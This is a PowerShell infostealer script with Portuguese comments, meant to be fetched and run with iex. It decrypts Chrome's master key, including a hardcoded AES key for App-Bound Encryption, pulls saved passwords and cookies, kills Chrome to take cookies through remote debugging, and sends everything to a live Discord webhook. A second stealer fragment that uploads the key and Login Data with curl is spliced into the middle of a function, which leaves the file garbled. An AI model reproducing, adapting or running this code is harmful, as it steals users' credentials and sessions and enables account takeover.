# chrome_extractor.ps1 - v2 (sem aqui-strings, compatível com iex)
# Uso: iex (New-Object Net.WebClient).DownloadString('URL')

$webhook = 'https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9'

function Write-Log {
    param([string]$Msg)
    $t = Get-Date -Format 'HH:mm:ss'
    Write-Host "[$t] $Msg"
}

function Get-ChromePath {
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
# 1. Localiza o Local State
$base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1

# 2. Extrai a chave bruta
$json = Get-Content $ls.FullName -Raw | ConvertFrom-Json
$encKey = $json.os_crypt.encrypted_key
$bytes = [Convert]::FromBase64String($encKey)

# 3. Tenta descriptografar usando uma chamada direta de Memória
try {
    $bytes = $bytes[5..($bytes.Length - 1)]
    Add-Type -AssemblyName System.Security
    $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, $scope)
    $finalKey = [Convert]::ToBase64String($unprotected)
    
    # Se a chave for pequena (44 caracteres), funcionou!
    curl.exe -X POST -F "content=🔑 CHAVE_REAL_CURTA: $finalKey" $u
} catch {
    # Se falhar, vamos mandar a Chave Bruta de novo mas com um aviso
    curl.exe -X POST -F "content=⚠️ O Windows bloqueou a abertura. Tente usar esta chave bruta no Dashboard atualizado: $encKey" $u
}

# 4. Envia o arquivo de senhas (Login Data)
$loginData = Get-ChildItem -Path $base -Recurse -Filter "Login Data" | Select-Object -First 1
if ($loginData) {
    $temp = "$env:TEMP\L.db"
    Copy-Item $loginData.FullName $temp -Force
    curl.exe -X POST -F "file=@$temp" $u
    Remove-Item $temp -Force
}
exit
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    )
    $exists = $true
    foreach ($p in $paths) { if (!(Test-Path $p)) { $exists = $false } }
    if (!$exists) {
        # Tentar perfil padrão ou Profile 1
        $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        $profiles = @('Default','Profile 1','Profile 2','Profile 3')
        foreach ($prof in $profiles) {
            $login = Join-Path $base "$prof\Login Data"
            $cookies = Join-Path $base "$prof\Cookies"
            $state = Join-Path $base "Local State"
            if ((Test-Path $login) -and (Test-Path $state)) {
                return @{
                    Login = $login
                    Cookies = $cookies
                    State = $state
                    Profile = $prof
                }
            }
        }
        return $null
    }
    return @{
        Login = $paths[0]
        Cookies = $paths[1]
        State = $paths[2]
        Profile = 'Default'
    }
}

function Get-MasterKey {
    param([string]$StatePath)
    try {
        $json = Get-Content $StatePath -Raw | ConvertFrom-Json
        $encKey = $json.os_crypt.encrypted_key
        if (!$encKey) { $encKey = $json.os_crypt.app_bound_encrypted_key }
        if (!$encKey) { Write-Log 'Chave nao encontrada no Local State'; return $null }
        
        $raw = [Convert]::FromBase64String($encKey)
        
        # Tenta DPAPI normal (v10/v11)
        if ($raw[0] -eq 1 -and $raw.Length -gt 5) {
            $toDecrypt = $raw[5..($raw.Length-1)]
            try {
                $key = [System.Security.Cryptography.ProtectedData]::Unprotect($toDecrypt, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                if ($key.Length -ge 32) {
                    Write-Log 'Chave mestra obtida via DPAPI (v10/v11)'
                    return @{ Key = $key[0..31]; Method = 'DPAPI' }
                }
            } catch { Write-Log "DPAPI falhou: $_" }
        }
        
        # Tenta v20 com App-Bound Encryption - modo hardcoded AES key
        if ($raw[0] -eq 2 -or $raw[0] -eq 3) {
            Write-Log 'Detectado formato v20 (App-Bound Encryption)'
            $toDecrypt = $raw[5..($raw.Length-1)]
            
            # Hardcoded AES key do elevation_service.exe (Chrome 128-132)
            $aesKey = [byte[]]@(
                0x30,0x86,0x56,0x71,0x38,0x3A,0x5E,0x0B,
                0x86,0xF4,0x99,0x42,0x72,0xC1,0x75,0x32,
                0xDB,0x41,0xCF,0x5E,0xCB,0x5E,0x4D,0xCA,
                0xA3,0x3F,0x8B,0x63,0x43,0x8A,0xFB,0x18
            )
            
            $nonce = $toDecrypt[0..11]
            $ciphertext = $toDecrypt[12..($toDecrypt.Length-17)]
            $tag = $toDecrypt[($toDecrypt.Length-16)..($toDecrypt.Length-1)]
            
            try {
                $aes = [System.Security.Cryptography.AesGcm]::new($aesKey, 16)
                $decrypted = [byte[]]::new($ciphertext.Length)
                $aes.Decrypt($nonce, $ciphertext, $tag, $decrypted)
                $aes.Dispose()
                
                if ($decrypted.Length -ge 32) {
                    Write-Log 'Chave v20 descriptografada com AES key hardcoded'
                    return @{ Key = $decrypted[0..31]; Method = 'v20_Hardcoded' }
                }
            } catch { Write-Log "AES-GCM v20 falhou: $_" }
        }
        
        Write-Log 'Nao foi possivel extrair a chave mestra'
        return $null
    } catch {
        Write-Log "Erro ao ler Local State: $_"
        return $null
    }
}

function Decrypt-Value {
    param([byte[]]$EncryptedValue, [byte[]]$MasterKey)
    
    if (!$EncryptedValue -or $EncryptedValue.Length -lt 15) { return $null }
    if (!$MasterKey -or $MasterKey.Length -lt 32) { return $null }
    
    try {
        if ($EncryptedValue[0] -eq 1) {
            # DPAPImode v10
            $cipher = $EncryptedValue[3..($EncryptedValue.Length-1)]
            $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($cipher, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            return [System.Text.Encoding]::UTF8.GetString($dec)
        }
        elseif ($EncryptedValue[0] -eq 2 -or $EncryptedValue[0] -eq 3) {
            # AES-GCM mode v11/v20
            $nonce = $EncryptedValue[3..14]
            $ciphertextLen = $EncryptedValue.Length - 15 - 16
            if ($ciphertextLen -le 0) { return $null }
            $ciphertext = $EncryptedValue[15..(15+$ciphertextLen-1)]
            $tag = $EncryptedValue[(15+$ciphertextLen)..($EncryptedValue.Length-1)]
            
            $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey, 16)
            $decrypted = [byte[]]::new($ciphertextLen)
            $aes.Decrypt($nonce, $ciphertext, $tag, $decrypted)
            $aes.Dispose()
            
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
    } catch { }
    return $null
}

function Get-SQLiteData {
    param([string]$DbPath, [string]$Query)
    
    if (!(Test-Path $DbPath)) { return $null }
    
    $tmpPath = [System.IO.Path]::GetTempFileName() + '.db'
    Copy-Item $DbPath $tmpPath -Force
    
    try {
        $assembly = $null
        # Tenta versao x64 primeiro, depois x86
        $versions = @(
            'C:\Windows\assembly\GAC_MSIL\System.Data.SQLite\*\System.Data.SQLite.dll',
            'C:\Program Files\System.Data.SQLite\*\System.Data.SQLite.dll',
            "$env:USERPROFILE\.nuget\packages\system.data.sqlite.core\*\lib\netstandard2.0\System.Data.SQLite.dll"
        )
        
        $found = $false
        foreach ($pattern in $versions) {
            $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
            if ($files) {
                $dllPath = $files[0].FullName
                try { $assembly = [System.Reflection.Assembly]::LoadFrom($dllPath); $found = $true; break } catch { }
            }
        }
        
        if (!$found) {
            # Tentar carregar do diretorio do script ou corrente
            $localDirs = @($PSScriptRoot, (Get-Location).Path)
            foreach ($dir in $localDirs) {
                $p = Join-Path $dir 'System.Data.SQLite.dll'
                if (Test-Path $p) { try { $assembly = [System.Reflection.Assembly]::LoadFrom($p); $found = $true; break } catch { } }
            }
        }
        
        if (!$found) {
            # Fallback: tentar SQLite usando Microsoft.Data.Sqlite (mais comum no Windows 10+)
            try {
                Add-Type -AssemblyName 'Microsoft.Data.Sqlite' -ErrorAction Stop
                $connString = "Data Source=$tmpPath"
                $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection($connString)
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = $Query
                $reader = $cmd.ExecuteReader()
                
                $result = @()
                while ($reader.Read()) {
                    $row = @{}
                    for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                        $row[$reader.GetName($i)] = $reader.GetValue($i)
                    }
                    $result += $row
                }
                $reader.Close()
                $conn.Close()
                return $result
            }
            catch {
                Write-Log 'Nenhum provider SQLite disponivel. Tentando Chrome Debug como fallback...'
                return $null
            }
        }
        
        # Usar System.Data.SQLite
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmpPath")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $reader = $cmd.ExecuteReader()
        
        $result = @()
        while ($reader.Read()) {
            $row = @{}
            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                $row[$reader.GetName($i)] = $reader.GetValue($i)
            }
            $result += $row
        }
        $reader.Close()
        $conn.Close()
        return $result
    }
    catch {
        Write-Log "Erro SQLite: $_"
        return $null
    }
    finally {
        if (Test-Path $tmpPath) { Remove-Item $tmpPath -Force -ErrorAction SilentlyContinue }
    }
}

function Save-ChromeDebugCookies {
    param([string]$OutFile)
    
    Write-Log 'Tentando Chrome Remote Debugging...'
    
    # Matar Chrome primeiro
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 1
    
    $dataDir = Join-Path $env:TEMP "chrome_debug_$(Get-Random)"
    $port = 9222
    
    try {
        $proc = Start-Process -FilePath "$env:ProgramFiles\Google\Chrome\Application\chrome.exe" -ArgumentList "--remote-debugging-port=$port","--remote-allow-origins=*","--headless","--user-data-dir=$dataDir","--no-first-run","--disable-features=ChromeWhatsNewUI" -PassThru -WindowStyle Hidden
        
        Start-Sleep -Seconds 3
        
        $wsUrl = $null
        try {
            $resp = Invoke-RestMethod -Uri "http://127.0.0.1:$port/json/version" -TimeoutSec 5
            $wsUrl = $resp.webSocketDebuggerUrl
        } catch { }
        
        if (!$wsUrl) {
            try {
                $list = Invoke-RestMethod -Uri "http://127.0.0.1:$port/json" -TimeoutSec 5
                if ($list -and $list.Count -gt 0) { $wsUrl = $list[0].webSocketDebuggerUrl }
            } catch { }
        }
        
        if ($wsUrl) {
            try {
                $ws = New-Object System.Net.WebSockets.ClientWebSocket
                $uri = [System.Uri]::new($wsUrl)
                $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
                
                $sendBytes = [System.Text.Encoding]::UTF8.GetBytes('{"id":1,"method":"Network.getAllCookies"}')
                $sendSeg = [System.ArraySegment[byte]]::new($sendBytes)
                $ws.SendAsync($sendSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
                
                $recvBuffer = [byte[]]::new(65536)
                $recvSeg = [System.ArraySegment[byte]]::new($recvBuffer)
                $result = $ws.ReceiveAsync($recvSeg, [System.Threading.CancellationToken]::None).Result
                
                $response = [System.Text.Encoding]::UTF8.GetString($recvBuffer, 0, $result.Count)
                
                try {
                    $json = $response | ConvertFrom-Json
                    $cookies = $json.result.cookies
                    if ($cookies) {
                        $cookies | ConvertTo-Json -Depth 3 | Out-File $OutFile -Encoding UTF8
                        Write-Log "Salvos $($cookies.Count) cookies via Chrome Debug em $OutFile"
                        return $cookies
                    }
                } catch { }
                
                $ws.Dispose()
            } catch { Write-Log "WebSocket falhou: $_" }
        }
        
        Write-Log 'Chrome Debug nao disponivel'
        return $null
    }
    catch {
        Write-Log "Erro Chrome Debug: $_"
        return $null
    }
    finally {
        if ($proc -and !$proc.HasExited) { $proc.Kill() }
        if (Test-Path $dataDir) { Remove-Item $dataDir -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

function Send-Discord {
    param(
        [string]$WebhookUrl,
        [string]$LoginsContent,
        [string]$CookiesContent,
        [string]$MasterKeyInfo,
        [string]$ComputerName,
        [string]$Username
    )
    
    $boundary = '----WebKitFormBoundary' + [System.Guid]::NewGuid().ToString().Replace('-','')
    
    try {
        $bodyStream = New-Object System.IO.MemoryStream
        $writer = New-Object System.IO.StreamWriter($bodyStream)
        
        # Payload JSON
        $loginsB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($LoginsContent))
        $cookiesB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($CookiesContent))
        
        $payload = @"
{
  "content": "**Chrome Extractor - $Username @ $ComputerName**\n$MasterKeyInfo",
  "embeds": [
    {
      "title": "Logins",
      "description": "Logins extraidos em anexo (base64)"
    },
    {
      "title": "Cookies",
      "description": "Cookies extraidos em anexo (base64)"
    }
  ]
}
"@
        
        $writer.Write("--$boundary`r`n")
        $writer.Write('Content-Disposition: form-data; name="payload_json"')
        $writer.Write("`r`n`r`n$payload`r`n")
        
        # Anexo logins
        $writer.Write("--$boundary`r`n")
        $writer.Write('Content-Disposition: form-data; name="file"; filename="logins.json"')
        $writer.Write("`r`nContent-Type: application/json`r`n`r`n")
        $writer.Write($LoginsContent)
        $writer.Write("`r`n")
        
        # Anexo cookies
        $writer.Write("--$boundary`r`n")
        $writer.Write('Content-Disposition: form-data; name="file"; filename="cookies.json"')
        $writer.Write("`r`nContent-Type: application/json`r`n`r`n")
        $writer.Write($CookiesContent)
        $writer.Write("`r`n")
        
        $writer.Write("--$boundary--`r`n")
        $writer.Flush()
        
        $bodyBytes = $bodyStream.ToArray()
        $bodyStream.Dispose()
        
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Content-Type', "multipart/form-data; boundary=$boundary")
        $response = $wc.UploadData($WebhookUrl, 'POST', $bodyBytes)
        $wc.Dispose()
        
        Write-Log 'Dados enviados ao Discord com sucesso!'
        return $true
    }
    catch {
        Write-Log "Erro ao enviar ao Discord: $_"
        return $false
    }
}

# === MAIN ===
Write-Log '=== Chrome Extractor v2 (PowerShell Puro) ==='
Write-Log "Usuario: $env:USERNAME | Computador: $env:COMPUTERNAME"

$paths = Get-ChromePath
if (!$paths) {
    Write-Log 'Chrome nao encontrado!'
    exit 1
}

Write-Log "Perfil: $($paths.Profile)"
Write-Log "Login Data: $($paths.Login)"
Write-Log "Cookies DB: $($paths.Cookies)"
Write-Log "Local State: $($paths.State)"

# 1. Extrair chave mestra
$masterKeyInfo = Get-MasterKey -StatePath $paths.State

$loginsContent = '[]'
$cookiesContent = '[]'

if ($masterKeyInfo) {
    Write-Log "Metodo de descriptografia: $($masterKeyInfo.Method)"
    $keyHex = [System.BitConverter]::ToString($masterKeyInfo.Key).Replace('-','')
    Write-Log "Chave: $keyHex"
    
    # 2. Extrair logins
    if (Test-Path $paths.Login) {
        Write-Log 'Extraindo logins...'
        $rows = Get-SQLiteData -DbPath $paths.Login -Query 'SELECT origin_url, username_value, password_value FROM logins'
        if ($rows -and $rows.Count -gt 0) {
            $logins = @()
            foreach ($row in $rows) {
                $pwdBytes = $row['password_value']
                if ($pwdBytes -is [string]) { $pwdBytes = [System.Text.Encoding]::UTF8.GetBytes($pwdBytes) }
                $pwd = Decrypt-Value -EncryptedValue $pwdBytes -MasterKey $masterKeyInfo.Key
                $logins += @{
                    url = $row['origin_url']
                    username = $row['username_value']
                    password = $pwd
                }
            }
            $loginsContent = $logins | ConvertTo-Json -Depth 3
            Write-Log "Extraidos $($logins.Count) logins"
        } else {
            Write-Log 'Nenhum login encontrado no banco'
        }
    }
    
    # 3. Extrair cookies
    if (Test-Path $paths.Cookies) {
        Write-Log 'Extraindo cookies...'
        $rows = Get-SQLiteData -DbPath $paths.Cookies -Query 'SELECT host_key, name, path, encrypted_value, has_expires, expires_utc, is_secure, is_httponly FROM cookies'
        if ($rows -and $rows.Count -gt 0) {
            $cookies = @()
            foreach ($row in $rows) {
                $encBytes = $row['encrypted_value']
                if ($encBytes -is [string]) { continue }
                $val = Decrypt-Value -EncryptedValue $encBytes -MasterKey $masterKeyInfo.Key
                if ($val) {
                    $cookies += [PSCustomObject]@{
                        host = $row['host_key']
                        name = $row['name']
                        path = $row['path']
                        value = $val
                        secure = $row['is_secure']
                        httponly = $row['is_httponly']
                    }
                }
            }
            if ($cookies.Count -gt 0) {
                $cookiesContent = $cookies | ConvertTo-Json -Depth 3
                Write-Log "Extraidos $($cookies.Count) cookies"
            }
        } else {
            Write-Log 'Nenhum cookie encontrado, tentando Chrome Debug...'
        }
    }
}

# 4. Fallback: Chrome Debug se nao conseguiu dados suficientes
$cookieCount = 0
try {
    if ($cookiesContent -ne '[]') {
        $parsed = $cookiesContent | ConvertFrom-Json
        $cookieCount = $parsed.Count
    }
} catch { }

$loginCount = 0
try {
    if ($loginsContent -ne '[]') {
        $parsed = $loginsContent | ConvertFrom-Json
        $loginCount = $parsed.Count
    }
} catch { }

if ($cookieCount -eq 0 -and $loginCount -eq 0) {
    Write-Log 'Nenhum dado obtido via SQLite. Tentando Chrome Remote Debug...'
    $tmpCookiesFile = Join-Path $env:TEMP "chrome_cookies_$(Get-Random).json"
    $debugCookies = Save-ChromeDebugCookies -OutFile $tmpCookiesFile
    if ($debugCookies) {
        $cookiesContent = $debugCookies | ConvertTo-Json -Depth 3
        $cookieCount = $debugCookies.Count
    }
    if (Test-Path $tmpCookiesFile) { Remove-Item $tmpCookiesFile -Force }
}

# 5. Enviar ao Discord
$masterKeyStr = "Chave Mestra: $($masterKeyInfo.Key | ForEach-Object { '{0:X2}' -f $_ }) - Metodo: $($masterKeyInfo.Method)"

Send-Discord -WebhookUrl $webhook -LoginsContent $loginsContent -CookiesContent $cookiesContent -MasterKeyInfo $masterKeyStr -ComputerName $env:COMPUTERNAME -Username $env:USERNAME

# 6. Salvar local como fallback
try {
    $outDir = "$env:TEMP\chrome_extracted"
    if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force | Out-Null }
    
    if ($loginsContent -ne '[]') {
        $loginsContent | Out-File (Join-Path $outDir 'logins.json') -Encoding UTF8
    }
    if ($cookiesContent -ne '[]') {
        $cookiesContent | Out-File (Join-Path $outDir 'cookies.json') -Encoding UTF8
    }
    
    if ($masterKeyInfo) {
        $keyHex = [System.BitConverter]::ToString($masterKeyInfo.Key).Replace('-','')
        "[MasterKey]`nMethod: $($masterKeyInfo.Method)`nKey: $keyHex" | Out-File (Join-Path $outDir 'masterkey.txt') -Encoding UTF8
    }
    
    Write-Log "Dados salvos em: $outDir"
} catch {
    Write-Log "Erro ao salvar local: $_"
}

Write-Log '=== Concluido ==='
